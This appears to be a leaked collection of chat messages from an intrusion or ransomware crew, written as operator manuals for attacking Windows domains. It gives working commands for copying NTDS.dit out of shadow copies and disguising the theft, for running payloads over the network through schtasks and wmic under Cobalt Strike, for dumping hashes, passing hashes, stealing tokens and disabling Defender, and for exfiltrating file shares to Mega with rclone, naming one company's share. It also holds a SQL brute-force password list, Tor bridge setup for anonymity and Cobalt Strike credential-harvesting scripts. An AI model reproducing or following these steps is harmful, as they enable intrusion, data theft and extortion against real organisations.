+```
+================================
+
+Date: 2021-05-10T20:28:22.869Z
+From: twin
+Message: ``` add firewall rules
+New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol TCP -Action allow
+New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol UDP -Action allow
+# add to registry new port
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name PortNumber -Value 1350
+#powershell
+Restart-Service termservice -force
+
+Change RDP port
+```
+================================
+
+Date: 2021-05-10T20:25:59.290Z
+From: twin
+Message: ```Install metasploit on vps
+
+
+1 apt-get update
+apt-get install curl
+apt-get install tmux
+apt-get install default-jdk
+apt-get install postgresql
+apt-get install nano
+apt-get install gpg
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+
+chmod +x msfinstall
+./msfinstall
+2
+then open
+
+nano /opt/metasploit-framework/bin/msfdb
+
+find and comment on these lines
+# if grep -q kali /etc/os-release; then
+# echo "Metasploit running on Kali Linux as root, using system database
+
+save CTRL+O
+msfdb init
+
+================================
+
+Date: 2021-05-10T20:22:22.525Z
+From: twin
+Message: 1) Script to collect the ball
+2) Script for collecting kerberos
+3) Script for hunting Admins
+
+Date: 2021-05-10T20:01:22.320Z
+From: twin
+Message: ```https://t.me/peass
+https://t.me/antichat
+https://t.me/thebugbountyhunter
+https://t.me/club1337
+https://t.me/infosec1
+https://t.me/RalfHackerChannel
+https://t.me/in51d3
+https://t.me/exploithacker
+https://t.me/Premium_Hacking
+https://t.me/DownloadCourse14
+https://t.me/ViperZCrew
+https://t.me/techpwnews
+https://t.me/cyb3rhunt3r
+https://t.me/cveNotify
+https://t.me/MalwareResearch
+https://t.me/BugCrowd
+https://t.me/itsecalert
+
+List of TG forums, a lot of interesting things
+```
+================================
+
+Date: 2021-05-10T19:59:10.784Z
+From: twin
+Message: ```NTDS DUMP METHOD
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
+almost certainly they are already there, if not, we do it ourselves
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+further in the listing of shadow copies we find the latest
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+accordingly we need a copy number for the next command
+
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"
+
+
+in c:\temp\log\ files ntds.dit / security / system should fall
+we take a portable console 7z and pack it into an archive with a password
+Code: [Highlight]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following
+
+
+Esentutl /p C:\log\ntds.dit
+
+
+the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
+in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive
+
+if you have troubles with what they fire and throw out of the network after the ntds dump - try this method
+it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
+```
+================================
+
+Date: 2021-05-10T19:58:33.551Z
+From: twin
+Message: ```a stack of manuals for elevating rights, who do not know English well, translate here deepl.com
+
+github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#active-directory-exploitation-cheat-sheet
+```
+
+Date: 2021-05-10T19:57:56.871Z
+From: twin
+Message: ```1. YOU HAVE FILE res.txt, OPEN IT IN NOTEPAD++
+2. PRESS CTRL + F IN THE SEARCH LINE ENTER TTL
+3. CLICK FIND ALL IN CURRENT DOCUMENT YOU WILL APPEAR A WINDOW WITH IP
+4. GO TO THE SITE en.toolpage.org/tool/ipv4-extractor THERE WE INSERT EVERYTHING WE GOT AND GET NET IP
+```
+================================
+
+Date: 2021-05-10T19:56:36.453Z
+From: twin
+Message: ```How to sort collected AD from network
+1) Download FileZilla
+
+
+2) Download Putty, run Putty through Tor
+
+Go here torproject.org/download/tor/
+
+Download ATTENTION Expert Bundle
+
+Unzip, go to the Tor directory and run tor.exe
+
+After a few seconds, it will reach the writing of 100% Done
+
+In the Putty settings, go to the proxy, set socks5, ip 127.0.0.1 port 9050
+
+3) We go through filezilla to the server > go to the "Script" directory - put the AD files next to the script
+
+4) Go to Putty, go to the server, go to the directory where the script is, give the command
+./script.sh
+
+5) Done, go back to FilleZilla and pick up our sorted. After yourself, be sure to delete the AD files and the sorted folder, if the sorted folder is not deleted, just change it to any name
+```
+================================
+
+Date: 2021-05-10T19:50:17.391Z
+From: twin
+Message: ```HOW TO JUMP SESSIONS WITH PAYLOADS
+
+Commands for launching a peloid to bring the session into cobalt
+1)shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00: 00
+2)shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
+3)shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
+instead of
+MS040926754153
+insert
+ipac cars
+take turns hammering commands
+1) creating a task with a payload
+2) cutting in
+3) removal
+
+
+Launching VMICOM we use it more often
+1) if it is a DLL, then
+shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"
+
+Accordingly, where is the ip, we insert the ip of the machine to which we have access, then the path and the name of our dll follow, I think the syntax is clear
+
+If you are on the RDP > open CMD as administrator and rundll32.exe C:\ProgramData\x64.dll,StartW respectively, you can specify any path, according to where your dll is located
+
+
+For EXE format or .bat format, launching VMICOM is as follows
+
+shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+
+================================
+
+Date: 2021-05-10T19:48:08.768Z
+From: twin
+Message: ```HOW AND WHAT INFO TO DOWNLOAD
+
+1) After we raised the rights, found the Admin Domain, we pull the sessions into cobalt
+2) We put on the YES token and remove the balls in this way:
+*powershell-import - upload ShareFinder there as usual and give the following command -
+psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+
+Next, we study the removed balls, we are interested in
+*Finance docks
+*Accounting
+*Aichi
+*Clients
+*Projects
+And so on, it all depends on what our target is doing
+
+Then we do the following > here is the Manual from Diablo, everything is lego accessible and understandable
+
+Rklon
+in order to start downloading via rklon you need to create a config
+to create a config, you need to open cmd go to the directory where rclone.exe is located
+run rclone.exe with command: rclone config
+then select new remote in the menu that appears
+call it mega then enter mega again
+after that we enter the mega mail address after he asks his pass to enter or generate we choose our letter 'Y'
+the pass will not appear when inserted, but it is inserted there anyway
+after creating the config, we are thrown into the main menu and we exit the clone.
+then we enter this command rclone.exe config show it will show the config itself that we created
+we copy it and create the rclone.conf file where we put this info.
+after we found the balls we are interested in, we upload the exe and the config to the target machine with rights, we hide the config and the exe so that they would not be found
+go to the directory of the executable and give the command: shell rclone.exe copy "\\envisionpharma.com\IT\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+where: \\envisionpharma.com\IT\KLSHARE is the balls
+Mega:Finanse location of files in mega (it can create a folder in mega by itself, you just need to specify it here)
+streams 12 --transfers 12 is the number of streams that download to the maximum (12) I do not recommend because you can easily get burned
+
+
+
+shell rclone.exe copy "\\PETERLENOVO.wist.local\Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3 - here is an example in in this case on FTP
+
+!!! RKLON ITSELF WEIGHS ABOUT 50MB, THE LINK TO IT WILL BE BELOW THE POST!!!
+```
+================================
+
+Date: 2021-05-10T19:46:14.733Z
+From: twin
+Message: ```GO TO AGENT:
+RIGHT CLICK ON THE AGENT AND CLICK INTERACT
+
+1) VIEW THE LIST OF ADMINISTRATORS shell net group "domain admins" /domain
+
+2) DOMAIN NAME shell net view /all /domain
+
+3) VIEW LIST DC shell nltest /dclist:"NameDomain"
+
+4) LEARN THE LIST OF SERVERS
+LOADING THE PowerView MODULE
+RIGHT CLICK ON AGENT Get Info > Get Servers
+GOT A LIST OF SERVERS
+
+5) LEARN THE LIST OF COMPUTERS
+BECAUSE THE PowerView MODULE IS ALREADY LOADED
+RIGHT CLICK ON AGENT Get Info > Get All Computers
+GOT A LIST OF COMPUTERS
+
+6) NEED TO LEARN THE PASSWORD OF ALL DOMAIN ADMIN
+RIGHT CLICK ON THE AGENT
+PRESS ACCESS > DUMP HASHES
+GO ABOVE THE VIEW > CREDENTIALS TAB
+WE TAKE ALL HASHES AND LOOK FOR DOMAIN ADMIN
+
+7) NEED TO FIND NAS , BACKUP
+WITH THIS COMMAND WE LEARN ALL SUBNETS OF THIS DOMAIN powershell Get-NetSubnet
+WITH THE FOLLOWING COMMAND YOU NEED TO FIND WHAT IP ADDRESS THE NAS IS BACKUP ON
+portscan 107.191.177.1-107.191.177.255 5000 icmp 1024
+
+LIST OF USEFUL COMMANDS WHICH MAY BE USEFUL:
+
+REMOVE AGENT RIGHTS BEFORE DEFAULT rev2self
+ENABLE USER VIA CMD shell net user Administrator /active:yes
+USER INFO shell net user careadmin /domain
+ENABLE RDP CONNECTION shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+DISABLE DEFENDER powershell Set-MpPreference -DisableRealtimeMonitoring $true
+UPDATE POLICY shell repadmin /syncall /AdeP
+SHOW DOMAIN TRUSTS shell nltest /domain_trusts /all_trusts
+LAUNCHING A PROGRAM ON ANOTHER PC shell wmic /node:"PC NAME" process call create "COMMAND TO BE EXECUTED"
+```
+================================
+
+Date: 2021-05-10T19:45:35.508Z
+From: twin
+Message: ```INITIAL ACTIONS
+
+1) Removing AD - allows us to find out how many servers and workstations are in the network, as well as information about users, who has what position, etc., after removing hell, we do sorted to sort only what we need - we will show this to you later
+2) Removing the ball (sharfinder) - with the help of it, we look where we have access with this user (to other PCs)
+3) Kerberos attack - pulls hashes out of memory, with successful removal and successful dehashing - DomainAdmin is provided to us
+4) If we have system rights, using the "hashdump" and "logonpasswords" commands, we can pull off the hashes and mimikadz and we will already have the domain user flogged, and sometimes the admin domain
+5) If we found the login and hash of the admin domain and at the same time we could not hash the hash, we do the following command pth Domain\Admin pass (in the form of a hash), using the command shell dir \\ip or hostname\c$ we will check access to a server or workstation
+6) If we found the login \ pass domain of the admin or user, we can put on his token, the command looks like this make_token Domain \ Admin Pass , if you want to remove the token, the rev2self command
+7) If there is a system process on the session, using the getsystem command, you can raise the system rights on the session, point (4)
+8) Also, do not forget to look at the processes using the ps command, you can find the user there, migrate to his process> Explore> Process list> then select the user process (the user must be different, not the one in the session) and press inject, select SSL listener
+9) After migrating to a new user, you also need to remove the balls to see where you can break through with him
+10) When you remove the shares, then at the end of the removal to the C:\ProgramData directory and there is sh.txt or shares.txt , download, see how many "remote admin" are in the textbook, if there are more than one, then this means that access is on another computer
+11) Click on the session > File Browser > write the path \\ip or hostname of the computer to which you have access\c$ , put the peloid there, I'll give it out later
+12) Launching a peloid depends on its format exe or dll, after launching I will personally explain later
+13) Ping servers and workstations like this, we need p.bat, I will throw it into the group. We create a txt, call it domains.txt, add the hostnames of servers or workers there. Hostnames are taken from the removed AD, with the help of a script, we will show them how to use
+14) If you find some kind of password, you can also run it through smb_login - this is a tool in metasploit, I will issue a metasploit and tell you how to use it. smb_login will show to which servers or workers, there is access with these credits
+
+================================
+
+Date: 2021-07-22T21:14:12.065Z
+From: graph
+Message: ```Armitage Teamserver Setup by Graf
+1. Install the metasploit
+	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+		
+		; ./msfconsole run metasploit
+
+2. Install PostgreSQL
+	
+	apt-get -y install postgresql
+	
+3. Install and unpack Armitage
+
+	wget http://fastandeasyhacking.com/download/armitage150813.tgz
+	tar zxvf armitage150813.tgz
+
+4. Create a user and give him sudo rights
+
+	adduser %username%
+	usermod -aG sudo %username%
+
+5. We initialize the metasploit base from under the newly created user and do export MSF_DATABASE_CONFIG with the .yml address obtained during initialization
+
+	msfdb init
+
+		; msfdb reinit - Deletes and reinitializes the database.
+		; msfdb delete - Deletes the database.
+		; msfdb start - Starts the database.
+		; msfdb stop - Stops the database.
+		; msfdb status - Shows the database status.
+
+	export MSF_DATABASE_CONFIG=/home/%username%/.msf4/database.yml
+
+6. Launch Armitage Teamserver
+
+	cd /path/to/armitage
+	./teamserver [external IP address] [password]
+	
+
+useful links
+
+	Install Metasploit Framework -
+		hxxps://docs.rapid7[.]com/metasploit/installing-the-metasploit-framework/
+	Installation Armitage -
+		hxxp://www.fastandeasyhacking[.]com/manual
+
+* This guide assumes that you already have experience with *unix systems and will be able to deal with the difficulties that arise in the process.
+
+================================
+
+Date: 2022-01-04T13:34:48.427Z
+From: benny
+Message: _## by adding bridge (!)_ at the beginning of each line - it seems to work without adding `bridge`, I personally added
+
+Date: 2022-01-04T13:25:38.016Z
+From: benny
+Message: ## here we enter the addresses received earlier on the site
+## by adding a bridge (!) at the beginning of each line
+bridge obfs4 ADDR1:PORT1 HASH1
+bridge obfs4 ADDR2:PORT2 HASH2
+bridge obfs4 ADDR3:PORT3 HASH3
+
+Date: 2022-01-04T13:33:03.322Z
+From: benny
+Message: ..need to edit torrc to include received addresses:
+Use Bridges 1
+TransPort 9040
+Exitpolicy reject `*:*`
+ExtORPort auto
+ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy managed
+
+Date: 2022-01-04T13:24:57.208Z
+From: benny
+Message: I'll add a couple of nuances to this manual (here for Linux, but the essence is clear, edit. torrc):
+
+================================
+
+Date: 2022-01-04T13:26:11.664Z
+From: hugo
+Message: @all Instructions on how to restore <TorBrowser>:
+
+1. Install any VPN browser extension.
+2. Get bridges "https://bridges.torproject.org/"
+3. Go to the browser settings and in the item "Find in settings" write "Bridges".
+4. We specify our bridges and TorBrowser comes to life.
+
+Instructions on how to restore the work of <TorExpertBundle>:
+
+1. Copy the "PluggableTransports" directory and the "torrc" file.
+```
+cmd cd C:\Users\Admin\Desktop\
+cmd copy Tor Browser\Browser\TorBrowser\Tor\PluggableTransports TorExpertBundle\Tor\PluggableTransports
+cmd copy Tor Browser\Browser\TorBrowser\Data\Tor\torrc TorExpertBundle\Tor\torrc
+```
+2. We change the contents of the "torrc" file, substituting our directories and new bridges.
+```
+Bridge obfs4 155.133.16.199:9003 1777CED1816756F493A909A71698B74A7035D422 cert=fUrO/thUgzUoEZvpd3XTSmodexQhk2nTAdFDtKcDFlatbJtxd6aBMc8+ifPdxNSxlAjtdiak=
+Bridge obfs4 168.119.54.228:443 0565AF490133E00709090B109E5ECD071FDCDE1F cert=tELhcFB2ZSs/FvOH58y8Fxnm/bC4yL7peWxN4hDSAfnll9JliaWjxcdyt7RvdyscAdDJRQ0=
+Bridge obfs4 141.5.104.172:8080 518F4BE56C6676A712ACB8B01FB0381FED6CB9A0 cert=4jLw0MmYmAIqigznXfrJCMYnybWXx618OXWQmC4oKBiB9swrxOOtpyZtzbM1u6VwrMAIIA iat-mode=
+
+DataDirectory C:\Users\Admin\Desktop\TorExpertBundle\Tor\
+GeoIPFile C:\Users\Admin\Desktop\TorExpertBundle\geoip
+GeoIPv6File C:\Users\Admin\Desktop\TorExpertBundle\geoip6
+
+## obfs4proxy configuration
+ClientTransportPlugin obfs4 exec C:\Users\Admin\Desktop\TorExpertBundle\Tor\PluggableTransports\obfs4proxy
+```
+
+3. And then run:
+```
+cmd tor.exe -f "C:\Users\Admin\Desktop\TorExpertBundle\Tor\torrc"
+
+Date: 2020-10-03T12:43:37.952Z
+From: tl1
+Message: I also recommend that you immediately collect your dictionary for brute sql for the future, which are not tied to the domain, year and server name
+
+================================
+
+Date: 2020-10-03T12:47:06.330Z
+From: tl2
+1234
+12345
+123456
+1234567
+12345678
+123456789
+1234567890
+sa
+Sasa
+sqlsa
+sqladmin
+sqladmin1
+sa1
+s@dmin
+P455w0rd
+p455w0rd
+p455word
+p455wOrd
+P455word
+P455wOrd
+P4ssw0rd
+p4ssw0rd
+p4sSw0rd
+p4Ssw0rd
+P4sword
+p4ssword
+p4sswOrd
+P4sswOrd
+P@55w0rd
+p@55w0rd
+p@55word
+P@55word
+p@55wOrd
+P@55wOrd
+pa55w0rd
+Pa55w0rd
+pa55word
+Pa55word
+Passw0rd
+passw0rd
+PasswOrd
+Password
+password
+PaSsWoRd
+PASSword
+PASSWORD
+passwOrd
+pa$w0rd
+pa$word
+P@ssw0rd
+p@ssw0rd
+p@sSw0rd
+p@ssw0rd
+P@ssword
+p@ssword
+p@sswOrd
+P@sswOrd
+P@$w0rd
+p@$w0rd
+p@$word
+p@$wOrd
+P@$word
+P@$wOrd
+P455w0rd1
+p455w0rd1
+p455word1
+p455wOrd1
+P455word1
+P455wOrd1
+P4ssw0rd1
+p4ssw0rd1
+p4sSw0rd1
+p4Ssw0rd1
+P4ssword1
+p4ssword1
+p4sswOrd1
+P4sswOrd1
+P@55w0rd1
+p@55w0rd1
+p@55word1
+P@55word1
+p@55wOrd1
+P@55wOrd1
+pa55w0rd1
+Pa55w0rd1
+pa55word1
+Pa55word1
+Passw0rd1
+passw0rd1
+PasswOrd1
+Password1
+password1
+PaSsWoRd1
+PASSword1
+PASSWORD1
+passwOrd1
+pa$w0rd1
+pa$word1
+P@ssw0rd1
+p@ssw0rd1
+p@sSw0rd1
+p@Ssw0rd1
+P@ssword1
+p@ssword1
+p@sswOrd1
+P@sswOrd1
+P@$w0rd1
+p@$w0rd1
+p@$word1
+p@$wOrd1
+P@$word1
+P@$wOrd1
+
+================================
+
+Date: 2021-01-26T18:44:42.019Z
+From: alter
+Message: If you find or stumble upon something else interesting - add it, I will throw it into the general selection.
+but ONLY what uses the native functionality of cobalt, exclusively .CNA files without any additional scripts, otherwise we will litter everything here.
+
+```
+##AV_Query
+AV_Query command Scans the registry for installed antiviruses
+##upload
+Alternative version of the upload command.
+Uploads a local file (first argument) to a remote host (second argument, optional).
+How to use: __upload </local/path/to/file> [/remote/path/to/file]__.
+Usage example: __beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe__.
+##Blacklist
+Blacklist for bacons. Removes bacon if it is running on a computer where the username and computername are in the blacklist.
+__blacklist-add__ - add to blacklist
+__blacklist-remove__ - remove from blacklist
+__blacklist-show__ - show blacklist
+## Credpocalypse
+Tracks bacons and collects credentials
+Use in bacon:
+__begin_credpocalypse__ 			- keep track of the current bacon
+	__end_credpocalypse [all]__ 		- stop tracking current/all bacons
+	__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Usage in console script or other script:
+__begin_credpocalypse__ 			- track all bacons
+	__end_credpocalypse [all]__ 		- stop tracking all bacons
+	__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Right click on the bacon to open the Credpocalypse menu
+##powershell2
+Alternative version of powershell command with enhanced operational security
+## Simple Beacon console status bar
+Shows the working directory, change the width of the bacon last occurrence indicator in the lower right corner to a fixed one
+Adds an option to the cd command to return to the previous directory.
+Usage: __cd -__
+## dcom_shellexecute
+Lateral movement with DCOM (ShellExecute)
+Usage: __dcom_shellexecute [target] [listener]__ - create new bacon on target via DCOM ShellExecute object
+##DebugKit
+Additional debugging tools in the DebugKit pop-up menu, console script and in the bacon.
+Commands in the console script:
+__!beaconinfo__ - get information about bacons
+__!loaded_powershell__ - show loaded powershell cmdlets for each bacon
+__!c2_sample_server__ - show how responses from C2 server look like
+__!c2_sample_client__ - show what client requests look like
+__!who__ - show everyone who is connected to the teamserver
+__!pwn3d_hosts__ - show a list of hostnames that have ever created sessions
+__!show_data_keys__ - show keys in Cobalt Strike data model
+__!query_data_key <key_name>__ - get values by key from Cobalt Strike data model
+__!sync_all_downloads__ - synchronizes downloaded files from the Cobalt Strike server to the specified folder and recursively recreates the file paths that the files had on the target hosts
+Usage: __!sync_all_downloads [/path/on/client/machine/to/save/downloads/to] <IP address of host to download files for>__
+Commands in bacon console:
+__!iscsadmin__ - check current bacon via -isadmin function
+##csfm
+Query the database for known commands, provide helpful hints to the operator.
+Syntax: __csfm [List]__ - list all csfm options
+Example: __search computer, tip ntlm__
+##EDR
+Remotely polls the system for EDR products
+Syntax: __edr_query [hostname] [arch]__
+## Color Coded Files Listing
+The script colorizes the output of the ls command and allows you to track downloaded files by highlighting them
+## Forwarded_Ports
+Keeps track of configured remote port forwardings on all bacons and makes it easy to remove them
+Using 'rportfwd' quickly consumes the pool of available local ports from which outgoing traffic is redirected, and keeping track of them manually becomes tedious on long-running projects. This script aims to fill that gap by collecting these commands and presenting them in a beautiful visualization panel.
+## HighLight_Beacons
+Highlights new beacons in green, inactive ones in red.
+## logvis
+Advanced beacon console output visualization.
+## MASS-DCSYNC
+DCSync attack applied to a list of domain users.
+The user list file must contain one user per line.
+
+##MIMIKATZ_ADDONS
+Performs a password change that allows you to change the NTLM password for this account.
+Uses the Mimikatz password change feature, which allows you to change the NTLM password for a given account without logging setpassword events.
+
+**Usage:** password_change [Username] [Known old hash or password] [New hash or password] [SERVER/DC/localhost]
+
+## PING_ALIASES
+1. alias **qping** sends a ping packet using the command line.
+**Usage**: qping [target]. The **target** parameter is optional.
+2. alias **smbscan** scans port 445.
+
+## PORTSCAN_RESULTS
+Menu item in the View section. When launched, a tab opens with the results of smbscan.
+
+##PROCESSCOLOR
+Highlighting process categories (antiviruses, explorer, browsers, current process) in the beacon process manager (Explore => ProcessList).
+
+## PS_WINDOW_ALIASES
+alias **pspane** opens the process manager.
+**Usage:** pspane
+
+## SLEEP_DOWN_WHEN_NO_OPERATORS
+Increases the sleep interval for beacons that do not have active (logged in) users.
+
+## SMART_AUTOPPID
+Redirects execution of beacon commands and all beacon jobs to a designated process (svchost.exe).
+All commands will be executed depending on the context/privilege (user or system).
+**Usage:** autoppid
+
+##WIN2012MIMIKATZ
+Adds a key to the registry for mimikatz to work.
+
